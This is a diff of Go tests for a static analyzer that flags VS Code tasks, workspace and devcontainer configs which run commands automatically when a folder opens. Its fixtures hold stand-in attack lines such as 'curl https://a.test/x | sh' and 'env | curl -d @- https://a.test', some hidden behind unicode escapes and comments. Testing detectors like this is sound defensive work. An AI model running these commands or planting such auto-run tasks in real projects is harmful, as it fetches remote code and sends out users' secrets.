@@ -9,6 +9,7 @@ import (
 
 	"github.com/mrdhira/galahad/internal/analyze"
 	"github.com/mrdhira/galahad/internal/analyze/static/autoexec"
+	"github.com/mrdhira/galahad/internal/protocol"
 )
 
 const (
@@ -51,6 +52,19 @@ func findings(t *testing.T, path, data string) ([]string, analyze.Output) {
 	return got, out
 }
 
+// fanOut returns a tasks file with n folder-open tasks that all depend on one
+// task that downloads and runs code. Everything is on line 2.
+func fanOut(n int) string {
+	var b strings.Builder
+	b.WriteString("{\"tasks\":[\n")
+	b.WriteString("{\"label\":\"dep\",\"command\":\"curl https://a.test/x | sh\"}")
+	for i := range n {
+		fmt.Fprintf(&b, ",{\"label\":\"t%d\",\"command\":\"echo\",\"dependsOn\":\"dep\",\"runOptions\":{\"runOn\":\"folderOpen\"}}", i)
+	}
+	b.WriteString("]}")
+	return b.String()
+}
+
 func TestAnalyze(t *testing.T) {
 	tests := []struct {
 		name string
@@ -62,6 +76,10 @@ func TestAnalyze(t *testing.T) {
 	}{
 		{name: "task on folder open with secret exfiltration in JSONC", path: ".vscode/tasks.json", data: tasksFolderOpen, want: []string{"001:7", "010:7"}},
 		{name: "task inside a container member", path: "repo.zip!/.vscode/tasks.json", data: tasksFolderOpen, want: []string{"001:7", "010:7"}},
+		{name: "script committed under .venv/bin is graded without inventory", path: ".venv/bin/pip", data: "#!/bin/sh\ncurl https://a.test/x | sh\n", want: []string{"011:2"}},
+		{name: "script committed under a nested venv/Scripts is graded", path: "sub/venv/Scripts/activate.bat", data: "curl https://a.test/x | sh\n", want: []string{"011:1"}},
+		{name: "script committed under node_modules/.bin is graded", path: "node_modules/.bin/tool", data: "curl https://a.test/x | sh\n", want: []string{"011:1"}},
+		{name: "benign script under node_modules/.bin", path: "node_modules/.bin/tool", data: "#!/bin/sh\nexec node ../tool/cli.js \"$@\"\n"},
 		{name: "task without runOn is not automatic", path: ".vscode/tasks.json", data: tasksNoRunOn},
 		{name: "task with platform command and args", path: ".vscode/tasks.json", data: `{"tasks":[{
   "runOptions":{"runOn":"folderOpen"},
@@ -80,16 +98,29 @@ func TestAnalyze(t *testing.T) {
 		{name: "dependsOn tasks are graded, cycles end", path: ".vscode/tasks.json", data: `{"tasks":[
 {"label":"a","command":"echo a","dependsOn":["b","a"],"runOptions":{"runOn":"folderOpen"}},
 {"label":"b","command":"curl https://a.test/x | sh","dependsOn":"a"}]}`, want: []string{"001:2", "011:3"}},
+		{name: "dependsOn task identifier objects are graded", path: ".vscode/tasks.json", data: `{"tasks":[
+{"label":"a","command":"echo","dependsOn":[{"type":"shell","task":"b"}],"runOptions":{"runOn":"folderOpen"}},
+{"label":"b","type":"shell","command":"curl https://a.test/x | sh"}]}`, want: []string{"001:2", "011:3"}},
+		{name: "dependsOn as a single task identifier", path: ".vscode/tasks.json", data: `{"tasks":[
+{"label":"a","command":"echo","dependsOn":{"type":"shell","task":"b"},"runOptions":{"runOn":"folderOpen"}},
+{"label":"b","command":"curl https://a.test/x | sh"}]}`, want: []string{"001:2", "011:3"}},
+		{name: "a task many tasks depend on is graded once, findings per rule are capped", path: ".vscode/tasks.json", data: fanOut(2000), want: append(slices.Repeat([]string{"001:2"}, protocol.MaxFindingsPerRulePerFile), "011:2")},
 		{name: "tasks in a code-workspace file", path: "x.code-workspace", data: `{"folders":[],"tasks":{"tasks":[
 {"command":"curl https://a.test/x | sh","runOptions":{"runOn":"folderOpen"}}]}}`, want: []string{"001:2", "011:2"}},
 		{name: "settings tool path into the repo", path: ".vscode/settings.json", data: `{
   // tools
   "eslint.nodePath": "./tools/node",
-  "python.defaultInterpreterPath": "${workspaceFolder}/.venv/bin/python",
+  "python.defaultInterpreterPath": "${workspaceFolder}/tools/python",
   "php.validate.executablePath": "/usr/bin/php",
   "python.pythonPath": ".venv/bin/python",
   "editor.fontSize": 12
 }`, want: []string{"002:3", "002:4"}},
+		{name: "settings paths into a virtualenv or node_modules are not reported", path: ".vscode/settings.json", data: `{
+  "python.defaultInterpreterPath": "${workspaceFolder}/.venv/bin/python",
+  "python.pythonPath": "${workspaceFolder}\\venv\\Scripts\\python.exe",
+  "eslint.nodePath": "${workspaceFolder}/node_modules/.bin/node",
+  "php.validate.executablePath": "${workspaceFolder}/.venv/../tools/php"
+}`, want: []string{"002:5"}},
 		{name: "settings terminal shell args with a command", path: ".vscode/settings.json", data: `{
   "terminal.integrated.profiles.linux": {"x": {"path": "bash", "args": ["-c", "id"]}},
   "terminal.integrated.shellArgs.windows": ["-NoLogo"]
@@ -220,6 +251,16 @@ func TestAnalyzeLexicalFallback(t *testing.T) {
 		{name: "tasks file with a missing comma", path: ".vscode/tasks.json", data: "{\"tasks\":[{\n\"command\":\"curl https://a.test/x | sh\"\n\"runOptions\":{\"runOn\":\"FOLDEROPEN\"}}]}", want: []string{"001:3", "011:2"}},
 		{name: "code-workspace with a syntax error", path: "x.code-workspace", data: "{\"tasks\":{\"tasks\":[{\n\"runOptions\":{\"runOn\":\"folderOpen\"} \"command\":\"env | curl -d @- https://a.test\"}]}", want: []string{"001:2", "010:2"}},
 		{name: "devcontainer with a syntax error", path: ".devcontainer/devcontainer.json", data: "{\n\"initializeCommand\":\"curl https://a.test/x | sh\"\n\"postCreateCommand\":\"echo hi\"}", want: []string{"003:2", "004:3", "011:2"}},
+		{name: "folderOpen written with a unicode escape", path: ".vscode/tasks.json", data: "{\"tasks\":[{\n\"command\":\"curl https://a.test/x | sh\"\n\"runOptions\":{\"runOn\":\"\\u0066olderOpen\"}}]}", want: []string{"001:3", "011:2"}},
+		{name: "runOn key written with a unicode escape", path: ".vscode/tasks.json", data: "{\"tasks\":[{\n\"command\":\"curl https://a.test/x | sh\"\n\"runOptions\":{\"run\\u004fn\":\"folderOpen\"}}]}", want: []string{"001:3", "011:2"}},
+		{name: "comment between runOn and its value", path: ".vscode/tasks.json", data: "{\"tasks\":[{\n\"command\":\"curl https://a.test/x | sh\"\n\"runOptions\":{\"runOn\" /*x*/ : \"folderOpen\"}}]}", want: []string{"001:3", "011:2"}},
+		{name: "command written with a unicode escape", path: ".vscode/tasks.json", data: "{\"tasks\":[{\n\"command\":\"c\\u0075rl https://a.test/x | sh\"\n\"runOptions\":{\"runOn\":\"folderOpen\"}}]}", want: []string{"001:3", "011:2"}},
+		{name: "an escaped backslash before u is not a unicode escape", path: ".vscode/tasks.json", data: "{\"tasks\":[{\n\"command\":\"echo\"\n\"runOptions\":{\"runOn\":\"\\\\u0066olderOpen\"}}]}"},
+		{name: "devcontainer key written with a unicode escape", path: ".devcontainer/devcontainer.json", data: "{\n\"initialize\\u0043ommand\":\"curl https://a.test/x | sh\"\n\"x\":1}", want: []string{"003:2", "011:2"}},
+		{name: "devcontainer lifecycle key behind a comment", path: ".devcontainer/devcontainer.json", data: "{\n\"postCreateCommand\" /*x*/ : \"echo hi\"\n\"x\":1}", want: []string{"004:2"}},
+		{name: "code-workspace with a comment and an escape", path: "x.code-workspace", data: "{\"tasks\":{\"tasks\":[{\n\"runOptions\":{\"runOn\" /*x*/ : \"\\u0066olderOpen\"} \"command\":\"env | curl -d @- https://a.test\"}]}", want: []string{"001:2", "010:2"}},
+		{name: "command graded even without a trigger in the broken file", path: ".vscode/tasks.json", data: "{\"tasks\":[{\n\"command\":\"curl https://a.test/x | sh\"\n\"label\":\"x\"}]}", want: []string{"011:2"}},
+		{name: "devcontainer command graded even without a trigger in the broken file", path: "x/.devcontainer/devcontainer.json", data: "{\n\"x\":\"curl https://a.test/x | sh\"\n\"y\":1}", want: []string{"011:2"}},
 		{name: "tasks file with a syntax error and no trigger", path: ".vscode/tasks.json", data: `{"tasks":[`},
 	}
 	for _, tt := range tests {
@@ -252,6 +293,47 @@ func TestAnalyzeCancelled(t *testing.T) {
 
 			if (err != nil) != tt.wantErr {
 				t.Errorf("err = %v, wantErr %v", err, tt.wantErr)
+			}
+		})
+	}
+}
+
+// expiring is a context that reports itself done after its first Err call.
+type expiring struct {
+	context.Context
+	calls int
+}
+
+func (c *expiring) Err() error {
+	c.calls++
+	if c.calls > 1 {
+		return context.DeadlineExceeded
+	}
+	return nil
+}
+
+func TestAnalyzeTimeout(t *testing.T) {
+	tests := []struct {
+		name string
+		// inputs
+		path string
+		data string
+		// expectations
+		wantReason string
+	}{
+		{name: "context ends while grading tasks", path: ".vscode/tasks.json", data: fanOut(10), wantReason: "timeout"},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			f := analyze.File{Path: tt.path, Name: "tasks.json", Data: []byte(tt.data)}
+
+			out, err := autoexec.New().Analyze(&expiring{Context: context.Background()}, f)
+
+			if err != nil {
+				t.Fatal(err)
+			}
+			if len(out.Skips) != 1 || out.Skips[0].Reason != tt.wantReason || out.Skips[0].Path != tt.path {
+				t.Errorf("skips = %v, want one %s for %s", out.Skips, tt.wantReason, tt.path)
 			}
 		})
 	}
